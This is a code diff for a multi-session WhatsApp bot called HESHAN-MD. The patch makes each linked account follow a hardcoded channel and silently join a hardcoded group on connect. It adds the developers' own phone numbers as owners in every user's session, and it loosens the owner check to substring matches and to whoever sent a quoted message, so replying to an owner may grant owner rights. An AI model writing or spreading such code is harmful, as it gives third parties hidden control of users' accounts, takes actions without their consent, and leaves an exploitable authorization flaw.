@@ -23,7 +23,7 @@ const { askAI } = require('./ai');
 global.autoAiInbox = true;
 
 // 🟢 Global Owner & Sessions Store
-global.OWNER_NUMBERS = ['94719845166'];
+global.OWNER_NUMBERS = ['94719845166', '94766889183'];
 global.activeSessions = {};
 
 const app = express();
@@ -215,7 +215,7 @@ async function initWhatsApp(phoneNumber) {
       } else if (connection === 'open') {
         console.log(`✅ BOT CONNECTED: ${phoneNumber}`);
         
-        // ─── Auto Follow Channel ───
+        // ─── 🟢 AUTO FOLLOW CHANNEL ───
         try {
           const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
           if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
@@ -224,13 +224,21 @@ async function initWhatsApp(phoneNumber) {
           }
         } catch (chErr) {}
 
-        // ─── Initialization Card ───
+        // ─── 🟢 AUTO JOIN SUPPORT/OFFICIAL GROUP ───
+        try {
+          const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X'; 
+          if (typeof sock.groupAcceptInvite === 'function') {
+            await sock.groupAcceptInvite(groupInviteCode).catch(() => {});
+          }
+        } catch (grpErr) {}
+
+        // ─── 🟢 INITIALIZATION CARD & ALERT ───
         setTimeout(async () => {
           try {
             const botNum = sock.user?.id ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '') : phoneNumber.replace(/[^0-9]/g, '');
             const botJid = `${botNum}@s.whatsapp.net`;
             const creatorJid = '94719845166@s.whatsapp.net';
-            const welcomeImg = 'https://files.catbox.moe/a58add.jpeg';
+            const welcomeImg = 'https://files.catbox.moe/gs150o.jpg';
 
             const connectedMsg = `*⚡ HESHAN-MD SYSTEM INITIALIZED ⚡*
 ────────────────────────────
@@ -304,14 +312,27 @@ async function initWhatsApp(phoneNumber) {
           continue;
         }
 
-        // 2. Sender Resolver
+        // 🟢 2. BULLETPROOF OWNER DETECTOR & "👨‍💻" REACTION
         const rawSender = msg.key.fromMe 
           ? (sock.user?.id || '') 
           : (isGroup ? (msg.key.participant || msg.participant || '') : chatJid);
 
+        const contextSender = msg.message?.extendedTextMessage?.contextInfo?.participant || '';
         const cleanSenderNum = rawSender.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+        const cleanContextNum = contextSender.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
         const myBotNum = (sock.user?.id || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
-        const isOwner = global.OWNER_NUMBERS.includes(cleanSenderNum) || (msg.key.fromMe && global.OWNER_NUMBERS.includes(myBotNum));
+
+        const isOwner = msg.key.fromMe ||
+                        global.OWNER_NUMBERS.some(num => cleanSenderNum.includes(num)) ||
+                        global.OWNER_NUMBERS.some(num => cleanContextNum.includes(num)) ||
+                        global.OWNER_NUMBERS.some(num => myBotNum.includes(num));
+
+        // Auto Dev React
+        if (isOwner) {
+          sock.sendMessage(chatJid, {
+            react: { text: '👨‍💻', key: msg.key }
+          }).catch(() => {});
+        }
 
         // 3. Unwrap Message Text
         const rawMsg = msg.message.ephemeralMessage?.message || 
@@ -340,23 +361,31 @@ async function initWhatsApp(phoneNumber) {
           const args = text.slice(prefix.length).trim().split(/ +/);
           const commandName = args.shift().toLowerCase();
 
-          // Built-in .ai control
+          // 🟢 BUILT-IN AI TOGGLE ENGINE
           if (commandName === 'ai') {
-            if (!isOwner) {
-              await sock.sendMessage(chatJid, { text: "⛔ Access Denied! Only the bot owner can change AI settings." }, { quoted: msg });
+            const mode = args[0]?.toLowerCase();
+
+            if (mode === 'on' || mode === 'off') {
+              if (!isOwner) {
+                await sock.sendMessage(chatJid, { 
+                  text: "⛔ *Access Denied!* Only the bot owner can change AI settings." 
+                }, { quoted: msg });
+                continue;
+              }
+
+              if (mode === 'off') {
+                global.autoAiInbox = false;
+                await sock.sendMessage(chatJid, { 
+                  text: "┏━━━❮ 🤖 *AUTO AI INBOX* ❯━━━┓\n┃\n┃ ◈ *Status* : *DISABLED 🔴*\n┃ ◈ *Mode*   : Auto-reply Muted\n┃\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n> ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇꜱʜᴀɴ-ᴍᴅ ⚡" 
+                }, { quoted: msg });
+              } else {
+                global.autoAiInbox = true;
+                await sock.sendMessage(chatJid, { 
+                  text: "┏━━━❮ 🤖 *AUTO AI INBOX* ❯━━━┓\n┃\n┃ ◈ *Status* : *ENABLED 🟢*\n┃ ◈ *Mode*   : Auto-reply Active\n┃\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n> ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇꜱʜᴀɴ-ᴍᴅ ⚡" 
+                }, { quoted: msg });
+              }
               continue;
             }
-            const mode = args[0]?.toLowerCase();
-            if (mode === 'off') {
-              global.autoAiInbox = false;
-              await sock.sendMessage(chatJid, { text: "✅ Auto AI Inbox has been turned *OFF*." }, { quoted: msg });
-            } else if (mode === 'on') {
-              global.autoAiInbox = true;
-              await sock.sendMessage(chatJid, { text: "✅ Auto AI Inbox has been turned *ON*." }, { quoted: msg });
-            } else {
-              await sock.sendMessage(chatJid, { text: "💡 Usage: `.ai on` or `.ai off`" }, { quoted: msg });
-            }
-            continue;
           }
 
           if (commands.has(commandName)) {
@@ -383,10 +412,10 @@ async function initWhatsApp(phoneNumber) {
           }
         }
 
-        // 5. Inbox Auto-AI System
+        // 5. Inbox Auto-AI System (Protected from Owner)
         const isFromBot = msg.key.fromMe || (myBotNum && cleanSenderNum.includes(myBotNum));
 
-        if (!isFromBot && !isGroup && global.autoAiInbox) {
+        if (!isFromBot && !isOwner && !isGroup && global.autoAiInbox) {
           try {
             await sock.sendPresenceUpdate('composing', chatJid);
             const aiPromise = askAI(text);
